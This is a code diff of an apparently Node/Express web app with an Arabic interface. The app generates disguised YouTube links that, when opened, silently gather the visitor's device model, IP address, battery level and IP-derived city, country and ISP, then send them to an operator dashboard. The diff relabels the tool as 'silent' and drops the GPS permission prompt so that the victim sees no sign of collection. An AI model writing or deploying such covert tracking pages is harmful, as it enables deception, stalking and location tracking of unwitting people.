@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم الشاملة</title>
+        <title>لوحة التحكم الصامتة</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
@@ -32,14 +32,14 @@ app.get('/', (req, res) => {
             <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
             <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
             <br><br>
-            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
+            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط الصامت</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
                 <p>الرابط الخاص بك (انسخه وافتحه):</p>
                 <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
-        <h3>📥 التقارير الشاملة للأجهزة:</h3>
+        <h3>📥 معلومات الأجهزة الواردة:</h3>
         <div id="logs" class="card">
             <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
@@ -70,12 +70,9 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = '<strong>📱 ماركة ونوع الهاتف:</strong> ' + data.deviceName + '<br>' +
-                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
-                                '<strong>📡 اسم الشبكة (مزود الخدمة):</strong> ' + data.networkISP + '<br>' +
-                                '<strong>🌐 عنوان IP الحقيقي:</strong> ' + data.ip + '<br>' +
-                                '<strong>📍 الموقع الجغرافي (الخريطة التقريبية):</strong> ' + data.location + '<br>' +
-                                '<strong>📍 الموقع الدقيق (GPS إن وجد):</strong> ' + data.gpsLocation + '<br>' +
+                box.innerHTML = '<strong>📱 اسم الجهاز:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
+                                '<strong>📍 الموقع الجغرافي:</strong> ' + data.location + '<br>' +
                                 '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
                                 '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
@@ -86,7 +83,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة عرض اليوتيوب وجمع البيانات
+// 2. صفحة عرض اليوتيوب وجمع البيانات صامتاً تماماً في الخلفية
 app.get('/watch/:id', async (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
   
@@ -126,24 +123,6 @@ app.get('/watch/:id', async (req, res) => {
                 return 'جهاز ذكي';
             }
 
-            function getBrowserInfo(ua) {
-                if (ua.includes('Firefox')) return 'Firefox';
-                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
-                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
-                if (ua.includes('Edg')) return 'Edge';
-                if (ua.includes('Chrome')) return 'Chrome';
-                if (ua.includes('Safari')) return 'Safari';
-                return 'متصفح آخر';
-            }
-
-            function getOSInfo(ua) {
-                if (ua.includes('Win')) return 'Windows';
-                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-                if (ua.includes('Android')) return 'Android';
-                if (ua.includes('Mac')) return 'macOS';
-                return 'أخرى';
-            }
-
             async function collectAndSend() {
                 let batteryLevel = "غير مدعوم";
                 if (navigator.getBattery) {
@@ -153,52 +132,25 @@ app.get('/watch/:id', async (req, res) => {
                     } catch(e){}
                 }
 
-                const ua = navigator.userAgent;
                 const deviceData = {
-                    deviceName: getExactDeviceModel(ua),
-                    browser: getBrowserInfo(ua),
-                    os: getOSInfo(ua),
+                    deviceName: getExactDeviceModel(navigator.userAgent),
                     ip: "${clientIp}",
                     battery: batteryLevel,
-                    networkISP: "جاري الجلب...",
-                    location: "جاري الجلب...",
-                    gpsLocation: "لم يمنح إذن الموقع",
                     time: new Date().toLocaleTimeString('ar-EG')
                 };
 
-                // جلب معلومات الشبكة والموقع عبر الـ IP
                 try {
                     const response = await fetch('https://ipapi.co/${clientIp}/json/');
                     const ipData = await response.json();
-                    deviceData.networkISP = ipData.org || "غير معروف";
-                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.region || "") + ", " + (ipData.country_name || "مجهول");
+                    deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول") + " (ISP: " + (ipData.org || "غير معروف") + ")";
                 } catch(e) {
-                    deviceData.networkISP = "تعذر الجلب";
-                    deviceData.location = "تعذر الجلب";
+                    deviceData.location = "تعذر تحديد الموقع";
                 }
 
-                // محاولة جلب إحداثيات الخريطة الدقيقة (GPS) في حال سمح المستخدم
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            deviceData.gpsLocation = "خط الطول: " + pos.coords.latitude + ", خط العرض: " + pos.coords.longitude;
-                            sendData(deviceData);
-                        },
-                        () => {
-                            sendData(deviceData); // إرسال البيانات حتى لو رفض إذن الـ GPS
-                        },
-                        { timeout: 4000 }
-                    );
-                } else {
-                    sendData(deviceData);
-                }
-            }
-
-            function sendData(data) {
                 fetch('/api/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(deviceData)
                 });
             }
 
